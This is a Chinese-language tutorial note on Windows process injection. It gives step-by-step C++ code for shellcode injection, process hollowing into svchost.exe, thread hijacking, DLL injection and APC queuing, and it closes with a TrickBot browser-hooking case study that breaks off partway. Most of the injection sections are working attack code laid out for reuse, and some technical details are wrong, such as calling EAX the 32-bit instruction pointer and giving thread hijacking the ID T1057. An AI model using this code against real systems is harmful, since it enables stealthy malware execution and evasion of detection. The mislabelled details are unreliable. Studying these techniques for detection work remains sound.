
#### 目录
- [利用进程：注入与操纵技术](#利用进程注入与操纵技术-exploiting-processes-injection-and-manipulation-techniques)
- [内存执行替代方案](#内存执行替代方案-memory-execution-alternatives-)
- [案例研究：浏览器注入与挂钩](#案例研究浏览器注入与挂钩-trickbot-的-ttp-️️)

#### 概述：Windows 内核与内部机制 (Overview: Windows Kernel and Internals)

**Windows 内核 (Windows Kernel)** 是 Windows 操作系统得以运行的核心组件，它负责管理系统资源、调度任务、处理硬件交互等关键功能。正因其核心地位，Windows 内核也成为了攻击者寻求恶意利用、权限提升、隐蔽执行及规避检测的重点目标。攻击者可能利用内核漏洞、驱动程序缺陷或内核对象的特性来执行恶意代码、隐藏活动痕迹，并与其他用户模式下的攻击技术或漏洞利用链相结合，以达到更深层次的系统控制。

广义上的 **Windows 内部机制 (Windows Internals)** 涵盖了操作系统后端运行的各种组件和概念。这不仅包括本笔记后续重点讨论的**进程 (Processes)**，还涉及到文件格式 (如 PE 格式)、组件对象模型 (COM)、任务调度机制、I/O 系统、注册表、服务管理等等。理解这些内部机制对于进行高级渗透测试、恶意软件分析、EDR 开发与绕过以及系统取证都至关重要。

---

#### 利用进程：注入与操纵技术 (Exploiting Processes: Injection and Manipulation Techniques)

在操作系统上运行的应用程序可以包含一个或多个进程。如前所述，进程是程序执行的实例，它维护着程序运行所需的所有资源。由于进程直接与内存（尤其是虚拟内存）交互，并拥有如打开句柄、安全上下文等关键子组件，它们成为了攻击者执行恶意代码、窃取信息或进行横向移动的理想目标。

##### 1. 进程关键组件回顾 (Process Key Components Revisited)

为更好地理解进程利用技术，我们再次回顾进程的关键组成部分：

|   |   |   |
|---|---|---|
|**组件 (Component)**|**英文原名 (Original English Name)**|**描述 (Description)**|
|**私有虚拟地址空间**|Private Virtual Address Space|进程被分配的、隔离的虚拟内存地址范围。|
|**可执行程序**|Executable Program|定义了存储在虚拟地址空间中的代码和初始化数据。|
|**打开句柄列表**|Open Handles|定义了进程可以访问的系统资源（如文件、其他进程等）的句柄。|
|**安全上下文**|Security Context|通常由访问令牌 (Access Token) 定义，包含了用户身份、所属安全组、持有的特权等安全相关信息。|
|**进程ID (PID)**|Process ID|操作系统为每个进程分配的唯一数字标识符。|
|**线程 (Threads)**|Threads|进程中实际执行代码的单元，一个进程至少包含一个线程，负责被操作系统调度执行。|

##### 2. 进程注入概述 (Process Injection Overview)

**进程注入 (Process Injection)** 通常被用作一个总称，指代一系列通过利用合法功能或组件将恶意代码注入到另一个活动进程的地址空间中执行的技术。这种技术的核心目的是在目标进程的上下文中执行代码，从而可能继承其权限、网络连接，或利用其受信状态来规避安全检测。

我们将重点关注以下几种常见的进程注入类型：

- **进程镂空 (Process Hollowing, T1055.012)**: 创建合法进程的挂起实例，将其内存内容替换（“镂空”）为恶意代码，然后恢复执行。
- **线程执行劫持 (Thread Execution Hijacking, T1057)**: 将代码注入到目标进程的某个挂起线程中，并修改该线程的指令指针以执行注入的代码。
- **动态链接库注入 (Dynamic-link Library Injection, T1055.001)**: 将恶意的 DLL 文件加载到目标进程的内存空间中执行。
- **可移植可执行文件注入 (Portable Executable Injection, T1055.002)**: 将整个 PE 镜像（通常指向恶意函数）注入到目标进程中执行。（注意: T1055.002 指的是直接在内存中执行PE，不一定涉及注入到_另一个_进程，但这里上下文似乎指将PE内容注入）

MITRE ATT&CK 的 T1055 (Process Injection) 及其子技术概述了更多形式的进程注入方法。

##### 3. 基础技术：Shellcode 注入 (Basic Technique: Shellcode Injection)

Shellcode 注入是最基本的进程注入形式之一，其目标是将一小段位置无关的机器码 (Shellcode) 注入目标进程并执行。

从较高层面看，Shellcode 注入可分为四个主要步骤：

1. **打开目标进程**: 以期望的访问权限（通常是所有访问权限 `PROCESS_ALL_ACCESS`）打开目标进程。
2. **分配内存**: 在目标进程的虚拟地址空间中为即将注入的 Shellcode 分配一块内存区域。
3. **写入 Shellcode**: 将 Shellcode 的字节码写入到目标进程中已分配的内存区域。
4. **执行 Shellcode**: 在目标进程中创建一个新的线程（远程线程）来执行写入的 Shellcode。

**API 调用步骤详解**:

- 步骤 1: 打开目标进程 (OpenProcess)
    
    使用 OpenProcess API 打开由命令行参数（例如 PID）指定的目标本地进程。
    
    C++
    
    ```
    // HANDLE processHandle;
    // DWORD targetPID = atoi(argv[1]); // 假设 argv[1] 是目标进程的 PID 字符串
    
    processHandle = OpenProcess(
        PROCESS_ALL_ACCESS,     // 请求所有可能的访问权限
        FALSE,                  // 目标句柄通常不被子进程继承
        targetPID               // 目标进程的 PID
    );
    // if (processHandle == NULL) { /* 错误处理 */ }
    ```
    
- 步骤 2: 为 Shellcode 分配内存 (VirtualAllocEx)
    
    使用 VirtualAllocEx API 在目标进程中分配内存。dwSize 参数通常使用 sizeof(shellcode) 来获取 Shellcode 的实际字节大小。
    
    C++
    
    ```
    // LPVOID remoteBuffer;
    // char shellcode[] = { /* ... shellcode bytes ... */ };
    
    remoteBuffer = VirtualAllocEx(
        processHandle,          // 已打开的目标进程句柄
        NULL,                   // 由系统选择分配地址 (通常设为 NULL)
        sizeof(shellcode),      // 要分配的内存区域大小 (Shellcode 的大小)
        (MEM_RESERVE | MEM_COMMIT), // 保留并提交页面
        PAGE_EXECUTE_READWRITE  // 内存保护属性：可执行、可读、可写
    );
    // if (remoteBuffer == NULL) { /* 错误处理 */ }
    ```
    
- 步骤 3: 将 Shellcode 写入内存 (WriteProcessMemory)
    
    使用 WriteProcessMemory API 将 Shellcode 写入到上一步在目标进程中分配的内存区域。
    
    C++
    
    ```
    // SIZE_T bytesWritten;
    WriteProcessMemory(
        processHandle,          // 目标进程句柄
        remoteBuffer,           // 目标进程中已分配的内存区域的基址
        shellcode,              // 指向要写入的 Shellcode 数据的指针
        sizeof(shellcode),      // 要写入的字节数
        NULL                    // (可选) 指向接收实际写入字节数的变量的指针，设为 NULL 则忽略
    );
    // if (bytesWritten != sizeof(shellcode)) { /* 错误处理 */ }
    ```
    
- 步骤 4: 创建远程线程执行 Shellcode (CreateRemoteThread)
    
    一旦 Shellcode 被写入目标进程的内存，就可以使用 CreateRemoteThread API 在目标进程中创建一个新线程，该线程的起始执行地址指向 Shellcode 所在的内存位置。
    
    C++
    
    ```
    // HANDLE remoteThread;
    remoteThread = CreateRemoteThread(
        processHandle,          // 目标进程句柄
        NULL,                   // 默认线程安全属性
        0,                      // 默认栈大小 (通常由可执行文件指定)
        (LPTHREAD_START_ROUTINE)remoteBuffer, // 线程起始执行地址 (指向 Shellcode)
        NULL,                   // 传递给线程函数的参数 (对于简单 Shellcode 通常为 NULL)
        0,                      // 线程创建后立即运行
        NULL                    // (可选) 指向接收线程ID的变量的指针，设为 NULL 则忽略
    );
    // if (remoteThread == NULL) { /* 错误处理 */ }
    // else { CloseHandle(remoteThread); }
    // CloseHandle(processHandle);
    ```
    

##### 4. 扩展进程滥用：进程镂空 (Advanced Process Abuse: Process Hollowing)

进程镂空 (Process Hollowing) 是一种更高级的注入技术，它允许将整个恶意可执行文件（PE 镜像）注入到另一个合法进程中。这通过创建一个挂起的合法进程，然后“镂空”其内存（即解除映射其原始代码），再将恶意的 PE 数据和节区注入到其地址空间来实现。

从高层次来看，进程镂空可分为六个主要步骤：

1. **创建挂起的目标进程**: 以挂起状态 (`CREATE_SUSPENDED`) 创建一个合法的目标进程。
2. **打开并读取恶意 PE 镜像**: 打开包含恶意代码的 PE 文件，并将其完整内容读入当前进程的内存。
3. **镂空目标进程内存**: 从目标进程的内存中卸载（解除映射）其合法的代码。
4. **为恶意代码分配内存**: 在目标进程的地址空间中（通常在其原始基址处）为恶意 PE 镜像分配新的内存。
5. **写入恶意 PE 镜像**: 将恶意 PE 镜像的头部和各个节区写入到目标进程新分配的内存中。
6. **设置线程上下文并恢复执行**: 修改目标进程主线程的上下文，使其指令指针指向恶意代码的入口点，然后恢复目标进程的执行。

**API 调用步骤详解**:

- 步骤 1: 创建挂起的目标进程 (CreateProcessA)
    
    使用 CreateProcessA (或 CreateProcessW) 创建目标进程，并指定 CREATE_SUSPENDED 标志。STARTUPINFOA 和 PROCESS_INFORMATION 结构用于传递和接收进程创建信息。
    
    C++
    
    ```
    LPSTARTUPINFOA target_si = new STARTUPINFOA();
    LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION();
    // CONTEXT c; // 后续会用到
    
    if (CreateProcessA(
        (LPSTR)"C:\\Windows\\System32\\svchost.exe", // 要执行的合法模块名称 (例如 svchost.exe)
        NULL,                   // 命令行参数
        NULL,                   // 进程安全属性
        NULL,                   // 线程安全属性
        TRUE,                   // 句柄是否被继承 (通常设为 FALSE，除非确实需要)
        CREATE_SUSPENDED,       // 关键标志：创建后进程处于挂起状态
        NULL,                   // 环境块
        NULL,                   // 当前目录
        target_si,              // 指向 STARTUPINFO 结构的指针
        target_pi               // 指向 PROCESS_INFORMATION 结构的指针 (接收进程和主线程句柄/ID)
    ) == 0) {
        // cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
        // return 1;
    }
    ```
    
- 步骤 2: 打开并读取恶意 PE 镜像
    
    这个过程分为三小步：
    
    1. 使用 `CreateFileA` 获取恶意 PE 文件的句柄。
        
        C++
        
        ```
        HANDLE hMaliciousCode = CreateFileA(
            (LPCSTR)"C:\\Path\\To\\Your\\malware.exe", // 恶意 PE 文件路径
            GENERIC_READ,           // 只读访问
            FILE_SHARE_READ,        // 共享模式：允许其他进程读取
            NULL,                   // 安全属性
            OPEN_EXISTING,          // 操作：如果文件存在则打开
            0,                      // 文件属性和标志 (原文为NULL，通常设为 FILE_ATTRIBUTE_NORMAL 或0)
            NULL                    // 模板文件句柄
        );
        // if (hMaliciousCode == INVALID_HANDLE_VALUE) { /* 错误处理 */ }
        ```
        
    2. 使用 `GetFileSize` 获取恶意文件大小，并使用 `VirtualAlloc` 在当前进程（攻击者进程）中为恶意 PE 镜像分配内存。
        
        C++
        
        ```
        DWORD maliciousFileSize = GetFileSize(hMaliciousCode, NULL); // 获取文件大小
        // if (maliciousFileSize == INVALID_FILE_SIZE) { /* 错误处理 */ }
        
        PVOID pMaliciousImage = VirtualAlloc(
            NULL,                   // 系统选择分配地址
            maliciousFileSize,      // 要分配的大小 (恶意文件大小)
            MEM_COMMIT | MEM_RESERVE, // 分配类型：提交并保留 (原文 0x3000)
            PAGE_READWRITE          // 内存保护：可读可写 (原文 0x04)
        );
        // if (pMaliciousImage == NULL) { /* 错误处理 */ }
        ```
        
    3. 使用 `ReadFile` 将恶意 PE 文件的内容读入到刚刚在当前进程分配的内存中。
        
        C++
        
        ```
        DWORD numberOfBytesRead;
        if (!ReadFile(
            hMaliciousCode,         // 恶意 PE 文件句柄
            pMaliciousImage,        // 指向当前进程中分配的缓冲区的指针
            maliciousFileSize,      // 要读取的字节数
            &numberOfBytesRead,     // 接收实际读取的字节数
            NULL
        ) || numberOfBytesRead != maliciousFileSize) {
            // cout << "[!] Unable to read Malicious file into memory. Error: " << GetLastError() << endl;
            // TerminateProcess(target_pi->hProcess, 0);
            // return 1;
        }
        CloseHandle(hMaliciousCode); // 关闭恶意文件句柄
        ```
        
- **步骤 3: 镂空目标进程内存**
    
    1. 获取目标进程主线程的上下文，以确定其映像基址。CPU 寄存器 EBX (在32位下) 通常指向进程环境块 (PEB)，PEB 中特定偏移量 (通常是 `+0x08`) 处存放着进程的映像基址。使用 `GetThreadContext` 获取寄存器值，然后用 `ReadProcessMemory` 读取基址。
        
        C++
        
        ```
        CONTEXT c; // 假设已声明
        c.ContextFlags = CONTEXT_FULL; // 或 CONTEXT_INTEGER 获取寄存器 (原文为 CONTEXT_INTEGER)
        if (!GetThreadContext(target_pi->hThread, &c)) { /* 错误处理 */ }
        
        PVOID pTargetImageBaseAddress;
        // 在32位下，c.Ebx 指向 PEB，ImageBaseOffset 为 0x8
        // 在64位下，c.Rdx 指向 PEB，ImageBaseOffset 为 0x10
        // 这里以32位为例，且假设 c.Ebx 确实是 PEB 地址
        if (!ReadProcessMemory(
            target_pi->hProcess,        // 目标进程句柄
            (PVOID)(c.Ebx + 0x08),      // 指向PEB中ImageBase字段的指针 (32位)
            &pTargetImageBaseAddress,   // 用于存储读取到的目标映像基址
            sizeof(PVOID),              // 要读取的字节数 (指针大小)
            NULL                        // 接收实际读取字节数 (可选)
        )) { /* 错误处理 */ }
        ```
        
    2. 使用 `ZwUnmapViewOfSection` (或 `NtUnmapViewOfSection`) 从 ntdll.dll 中动态获取并调用，以解除映射目标进程原始基址处的内存区域。
        
        C++
        
        ```
        typedef NTSTATUS (WINAPI *PFN_ZWUNMAPVIEWOFSECTION)(HANDLE, PVOID);
        HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll");
        PFN_ZWUNMAPVIEWOFSECTION pfnZwUnmapViewOfSection = (PFN_ZWUNMAPVIEWOFSECTION)GetProcAddress(
            hNtdllBase,
            "ZwUnmapViewOfSection"
        );
        // if (pfnZwUnmapViewOfSection == NULL) { /* 错误处理 */ }
        
        NTSTATUS dwResult = pfnZwUnmapViewOfSection(
            target_pi->hProcess,        // 目标进程句柄
            pTargetImageBaseAddress     // 要解除映射的基址 (即目标进程的原始映像基址)
        );
        // if (!NT_SUCCESS(dwResult)) { /* 错误处理 */ }
        ```
        
- 步骤 4: 为恶意代码分配内存 (VirtualAllocEx)
    
    在目标进程中，于其原始映像基址 (或期望的基址) 处，为恶意 PE 镜像分配新的内存。所需内存大小从恶意 PE 镜像的 OptionalHeader.SizeOfImage 字段获取。
    
    C++
    
    ```
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage;
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew);
    DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage;
    
    PVOID pHollowAddress = VirtualAllocEx(
        target_pi->hProcess,        // 目标进程句柄
        pTargetImageBaseAddress,    // 期望的分配基址 (通常是目标进程的原始基址)
        sizeOfMaliciousImage,       // 要分配的大小 (恶意PE的SizeOfImage)
        MEM_COMMIT | MEM_RESERVE,   // 分配类型 (原文 0x3000)
        PAGE_EXECUTE_READWRITE      // 内存保护 (原文 0x40)
    );
    // if (pHollowAddress == NULL) { /* 可能是因为该地址已被占用或参数无效，错误处理 */ }
    // 如果 pHollowAddress != pTargetImageBaseAddress 且恶意PE有重定位表，可能需要处理重定位
    ```
    
- **步骤 5: 写入恶意 PE 镜像 (`WriteProcessMemory`)**
    
    1. 首先，将恶意 PE 镜像的头部 (从文件开始到所有节头结束) 写入目标进程新分配内存的起始位置。头部大小由 `OptionalHeader.SizeOfHeaders` 决定。
        
        C++
        
        ```
        if (!WriteProcessMemory(
            target_pi->hProcess,
            pHollowAddress, // 注意：这里使用 VirtualAllocEx 返回的实际分配地址
            pMaliciousImage,            // 指向当前进程中恶意PE镜像的指针
            pNTHeaders->OptionalHeader.SizeOfHeaders, // 要写入的PE头部大小
            NULL
        )) {
            // cout<< "[!] Writting Headers failed. Error: " << GetLastError() << endl;
            // TerminateProcess(target_pi->hProcess, 0); return 1;
        }
        ```
        
    2. 然后，遍历恶意 PE 镜像的节表，将每个节的原始数据 (`PointerToRawData`, `SizeOfRawData`) 写入到目标进程中对应节的虚拟地址 (`VirtualAddress`) 处。
        
        C++
        
        ```
        for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage +
                pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
        
            if (!WriteProcessMemory(
                target_pi->hProcess,
                (PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), // 目标节区地址
                (PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), // 源节区数据
                pSectionHeader->SizeOfRawData, // 节区大小
                NULL
            )) { /* 错误处理 */ }
        }
        ```
        
- **步骤 6: 设置线程上下文并恢复执行**
    
    1. 修改目标进程主线程的上下文 (`CONTEXT` 结构)，将其指令指针 (EAX for 32-bit, RIP for 64-bit) 设置为恶意 PE 镜像的入口点 (`OptionalHeader.AddressOfEntryPoint` 加上实际加载基址 `pHollowAddress`)。
        
        C++
        
        ```
        // c 已在步骤3获取并可能被修改，如果需要重新获取或确保其最新状态
        // GetThreadContext(target_pi->hThread, &c); // 重新获取可能更安全
        // 32位下修改 Eax, 64位下修改 Rip
        c.Eax = (DWORD)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); // 32位示例
        // c.ContextFlags 必须包含 CONTEXT_CONTROL 或 CONTEXT_INTEGER
        if (!SetThreadContext(target_pi->hThread, &c)) { /* 错误处理 */ }
        ```
        
    2. 使用 `ResumeThread` 恢复目标进程主线程的执行，此时它将从恶意代码的入口点开始运行。
        
        C++
        
        ```
        if (ResumeThread(target_pi->hThread) == (DWORD)-1) { /* 错误处理 */ }
        // CloseHandle(target_pi->hThread);
        // CloseHandle(target_pi->hProcess);
        ```
        

##### 5. 滥用进程组件：线程执行劫持 (Abusing Process Components: Thread Execution Hijacking)

线程执行劫持 (T1057) 是一种通过控制目标进程中现有线程的执行流来运行恶意代码的技术。

大致步骤如下：

1. 定位并打开目标进程。
2. 为恶意代码在目标进程中分配内存。
3. 将恶意代码写入分配的内存。 (这前三步与标准 Shellcode 注入类似，代码片段已在前面提供，此处不再重复)
4. **确定要劫持的目标线程 ID**: 遍历目标进程的所有线程。
5. **打开目标线程**: 获取目标线程的句柄。
6. **挂起目标线程**: 暂停目标线程的执行。
7. **获取线程上下文**: 保存目标线程当前的寄存器状态。
8. **更新指令指针**: 修改线程上下文中保存的指令指针 (RIP/EIP)，使其指向注入的恶意代码。
9. **重写目标线程上下文**: 将修改后的上下文应用回目标线程。
10. **恢复被劫持的线程**: 恢复线程执行，此时它将从恶意代码处开始运行。
11. (可选) 恶意代码执行完毕后，可能需要恢复原始指令指针和线程状态，以避免目标程序崩溃。

**API 调用步骤详解 (从第4步开始)**:

- 步骤 4 & 5: 枚举并打开目标线程 (CreateToolhelp32Snapshot, Thread32First, Thread32Next, OpenThread)
    
    使用 Toolhelp API 枚举指定进程 (processId) 的所有线程，找到一个合适的线程进行劫持，并使用 OpenThread 打开它。
    
    C++
    
    ```
    // DWORD processId; // 假设已获取目标进程PID
    // HANDLE hThread = NULL; // 用于存储目标线程句柄
    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); // 创建系统所有线程的快照
    // if (hSnapshot == INVALID_HANDLE_VALUE) { /* 错误处理 */ }
    
    if (Thread32First(hSnapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processId) { // 检查线程是否属于目标进程
                hThread = OpenThread(
                    THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, // 请求必要权限 (原文 THREAD_ALL_ACCESS)
                    FALSE,
                    threadEntry.th32ThreadID // 从 THREADENTRY32 结构中读取线程ID
                );
                // if (hThread != NULL) { break; /* 找到了一个线程并成功打开 */ }
            }
        } while (Thread32Next(hSnapshot, &threadEntry));
    }
    CloseHandle(hSnapshot);
    // if (hThread == NULL) { /* 未找到或打开线程失败，错误处理 */ }
    ```
    
- **步骤 6: 挂起目标线程 (`SuspendThread`)**
    
    C++
    
    ```
    // if (SuspendThread(hThread) == (DWORD)-1) { /* 错误处理 */ }
    ```
    
- **步骤 7: 获取线程上下文 (`GetThreadContext`)**
    
    C++
    
    ```
    CONTEXT context;
    context.ContextFlags = CONTEXT_CONTROL; // 指定需要获取控制寄存器 (如 EIP/RIP)
    // if (!GetThreadContext(hThread, &context)) { /* 错误处理 */ }
    ```
    
- 步骤 8: 更新指令指针
    
    将上下文结构中的指令指针 (32位为 Eip，64位为 Rip) 修改为指向先前注入的 Shellcode (remoteBuffer)。
    
    C++
    
    ```
    // PVOID remoteBuffer; // 假设已分配并写入 Shellcode 的地址
    context.Rip = (DWORD_PTR)remoteBuffer; // 64位示例
    // context.Eip = (DWORD)remoteBuffer; // 32位示例
    ```
    
- **步骤 9: 重写目标线程上下文 (`SetThreadContext`)**
    
    C++
    
    ```
    // if (!SetThreadContext(hThread, &context)) { /* 错误处理 */ }
    ```
    
- **步骤 10: 恢复被劫持的线程 (`ResumeThread`)**
    
    C++
    
    ```
    // if (ResumeThread(hThread) == (DWORD)-1) { /* 错误处理 */ }
    // CloseHandle(hThread); // 清理
    ```
    

##### 6. 滥用动态链接库：DLL 注入 (Abusing Dynamic Link Libraries: DLL Injection)

DLL 注入 (T1055.001) 是将恶意 DLL 加载到目标进程内存中执行的技术。

主要步骤：

1. **定位目标进程**: 找到要注入的进程的 PID。
2. **打开目标进程**: 获取目标进程的句柄。
3. **为 DLL 路径分配内存**: 在目标进程中为恶意 DLL 的完整路径字符串分配内存。
4. **将 DLL 路径写入内存**: 将恶意 DLL 的路径写入到目标进程中分配的内存。
5. **加载并执行恶意 DLL**: 在目标进程中创建一个远程线程，该线程调用 `LoadLibraryA` (或 `LoadLibraryW`) 函数，参数为指向已写入的 DLL 路径的指针。

**API 调用步骤详解**:

- 步骤 1: 定位目标进程 PID (CreateToolhelp32Snapshot, Process32First, Process32Next)
    
    通过遍历进程快照来查找指定名称 (processName) 的进程，并获取其 PID。
    
    C++
    
    ```
    // const char *processName = "target.exe"; // 目标进程名
    // DWORD processId = 0;
    
    DWORD getProcessIdByName(const char *procName) {
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
        if (Process32First(hSnapshot, &entry)) {
            do {
                if (_stricmp(entry.szExeFile, procName) == 0) { // 比较进程名 (忽略大小写)
                    CloseHandle(hSnapshot);
                    return entry.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, &entry));
        }
        CloseHandle(hSnapshot);
        return 0; // 未找到
    }
    // processId = getProcessIdByName(processName);
    // if (processId == 0) { /* 错误处理 */ }
    ```
    
- 步骤 2: 打开目标进程 (OpenProcess)
    
    (与 Shellcode 注入中的步骤1类似，此处不再重复代码)
    
    C++
    
    ```
    // HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    // if (hProcess == NULL) { /* 错误处理 */ }
    ```
    
- 步骤 3: 为 DLL 路径分配内存 (VirtualAllocEx)
    
    为存储恶意 DLL 的完整路径字符串在目标进程中分配内存。
    
    C++
    
    ```
    // const char *dllLibFullPath = "C:\\Path\\To\\Your\\malicious.dll";
    // LPVOID dllPathAllocatedMemory = VirtualAllocEx(
    //     hProcess,
    //     NULL,
    //     strlen(dllLibFullPath) + 1, // +1 为空终止符
    //     MEM_RESERVE | MEM_COMMIT,
    //     PAGE_READWRITE // DLL路径不需要执行权限，可读可写即可
    // );
    // if (dllPathAllocatedMemory == NULL) { /* 错误处理 */ }
    ```
    
- **步骤 4: 将 DLL 路径写入内存 (`WriteProcessMemory`)**
    
    C++
    
    ```
    // if (!WriteProcessMemory(
    //     hProcess,
    //     dllPathAllocatedMemory,
    //     dllLibFullPath,
    //     strlen(dllLibFullPath) + 1,
    //     NULL
    // )) { /* 错误处理 */ }
    ```
    
- 步骤 5: 加载并执行恶意 DLL (GetProcAddress, CreateRemoteThread)
    
    获取 kernel32.dll 中 LoadLibraryA (或 LoadLibraryW) 函数的地址，然后在目标进程中创建一个远程线程，使其执行 LoadLibraryA，并将先前写入的 DLL 路径作为参数传递给它。
    
    C++
    
    ```
    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    // if (pLoadLibraryA == NULL) { /* 错误处理 */ }
    
    // HANDLE hRemoteThread = CreateRemoteThread(
    //     hProcess,
    //     NULL,
    //     0,
    //     (LPTHREAD_START_ROUTINE)pLoadLibraryA, // 线程起始地址：LoadLibraryA
    //     dllPathAllocatedMemory,               // 传递给 LoadLibraryA 的参数：DLL路径字符串的地址
    //     0,
    //     NULL
    // );
    // if (hRemoteThread == NULL) { /* 错误处理 */ }
    // else { CloseHandle(hRemoteThread); }
    // CloseHandle(hProcess); // VirtualFreeEx(hProcess, dllPathAllocatedMemory, 0, MEM_RELEASE);
    ```
    

---

#### 内存执行替代方案 (Memory Execution Alternatives) 🤫

在某些受限环境（如 API 钩子、EDR 监控）下，标准的 `CreateRemoteThread` 可能被检测或阻止。此时，可以考虑其他内存执行方法。

##### 1. 调用函数指针 (Calling Function Pointers)

这是一种在本地进程中执行内存块（如 Shellcode）的技术，它依赖于类型转换将内存地址视为函数指针并直接调用，理论上可以避免显式的执行 API 调用。

单行代码示例：`((void(*)())addressPointer)();`

分解步骤：

1. **创建函数指针类型**: `(void(*)())` 定义了一个无参数、无返回值的函数指针类型。
2. **类型转换**: `(<function pointer>)addressPointer` 将 `addressPointer`（指向 Shellcode 的内存地址）强制转换为该函数指针类型。
3. **调用**: 最后的 `()` 执行该函数指针，即执行 Shellcode。

这种技术主要用于本地执行，对于远程进程执行，仍需先将代码置入远程进程并找到方法触发此调用（例如通过劫持现有函数指针）。

##### 2. 异步过程调用 (Asynchronous Procedure Calls - APC)

**异步过程调用 (APC)** 是在特定线程上下文中异步执行的函数。可以使用 `QueueUserAPC` API 将一个 APC 函数排入目标线程的 APC 队列。当该线程下一次进入**可唤醒状态 (Alertable State)** 时（例如调用了 `SleepEx`, `WaitForSingleObjectEx`, `MsgWaitForMultipleObjectsEx` 等函数并允许 APC 执行），排队的 APC 函数就会被执行。

恶意利用步骤：

1. 在目标进程中分配内存并写入 Shellcode (使用 `VirtualAllocEx`, `WriteProcessMemory`)。
2. 将 Shellcode 的地址作为 APC 函数指针，使用 `QueueUserAPC` 将其排入目标进程中某个合适的线程 (例如主线程，或任何已知会进入可唤醒状态的线程)。
3. (可选/根据情况) 确保或触发目标线程进入可唤醒状态。如果线程已在等待，APC 会在其被唤醒时执行。

C++

```
// PVOID addressPointer; // 指向已写入远程进程的 Shellcode
// PROCESS_INFORMATION pinfo; // 目标进程信息，pinfo.hThread 是目标线程句柄

// QueueUserAPC(
//     (PAPCFUNC)addressPointer, // APC 函数指针 (指向 Shellcode)
//     pinfo.hThread,            // 目标线程句柄
//     (ULONG_PTR)NULL           // 传递给 APC 函数的参数 (通常为 NULL)
// );
// // 确保线程最终会进入alertable wait state
// // ResumeThread(pinfo.hThread); // 如果线程是挂起的，需要恢复
// // WaitForSingleObject(pinfo.hProcess, INFINITE); // 等待进程结束，以观察APC是否执行
```

APC 注入是一种相对隐蔽的执行方式，但近年来也受到了安全产品的关注和检测。

##### 3. PE 节操作 (PE Section Manipulation)

这是一种更底层的技术，通常用于在内存中手动加载和执行 PE 文件，或在现有模块中寻找可利用的空间。它依赖于对 PE 文件格式的深刻理解。

- **获取 PE 转储**: 通常使用工具（如 `xxd`）将 DLL 或可执行文件转换为十六进制数据。
- **手动解析与映射**: 通过计算偏移量在十六进制数据中定位 PE 头部和节表，然后模拟加载器的行为，将节区映射到内存，处理导入表、重定位等。
- **常见技术**:
    - **RVA 入口点解析**: 计算并跳转到 PE 的入口点。
    - **节映射**: 将 PE 的各个节手动复制到合适的内存位置。
    - **重定位表解析**: 如果 PE 加载到的基址与 `OptionalHeader.ImageBase` 不同，则需要根据重定位表修复绝对地址引用。

这些技术非常灵活，允许攻击者精细控制内存布局和执行流程，但也更复杂。

---

#### 案例研究：浏览器注入与挂钩 (TrickBot 的 TTP) 🕵️‍♂️

TrickBot 是一种臭名昭著的银行木马，其核心功能之一是浏览器挂钩 (Browser Hooking)，用于拦截和窃取用户凭据。

##### 1. 针对浏览器进程

TrickBot 首先会定位常见的浏览器进程 (如 chrome.exe, iexplore.exe, firefox.exe) 并使用 OpenProcess 获取其句柄。

(反汇编代码片段示意了这一过程，通过 push offset Srch 等指令准备进程名，然后调用 OpenProcess)

##### 2. 反射式注入流程概述 (SentinelLabs 分析)

1. **打开目标进程**: `OpenProcess`
2. **分配内存**: `VirtualAllocEx` (用于存储注入的函数和 Shellcode)
3. **复制挂钩安装函数到分配内存**: `WriteProcessMemory`
4. **复制 Shellcode (实际的挂钩逻辑或下一阶段载荷) 到分配内存**: `WriteProcessMemory`
5. **刷新指令缓存**: `FlushInstructionCache` (确保 CPU 执行的是新写入的代码)
6. **创建远程线程**: `CreateRemoteThread` (执行挂钩安装函数)
7. **恢复线程或回退**: `ResumeThread` 或 `RtlCreateUserThread`

##### 3. 挂钩安装函数分析 (伪代码)

一旦注入的代码（挂钩安装函数）在浏览器进程中执行，它会执行以下操作来挂钩目标 API：

1. 计算相对偏移和获取原始函数信息:
    
    通过指针运算计算要挂钩的原始API函数 (original_function) 与自定义的钩子函数 (myHook_function) 之间的相对偏移。同时获取原始函数开头的一些字节和地址。
    
    C++
    
    ```
    // relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5; // 计算JMP指令的偏移
    // trampoline_lpvoid = *(void **)(original_function + 1); // 可能指向函数内部或参数
    ```
    
2. 修改内存保护:
    
    使用 VirtualProtectEx 将目标 API 函数开头的内存区域权限修改为可读写执行 (PAGE_EXECUTE_READWRITE 或 0x40)，以便可以改写其指令。
    
    C++
    
    ```
    // VirtualProtectEx((HANDLE)0xFFFFFFFF, trampoline_lpvoid, v8, 0x40u, &flOldProtect);
    ```
    
    `(HANDLE)0xFFFFFFFF` 通常指当前进程。
    
3. 写入 JMP 指令 (函数指针挂钩):
    
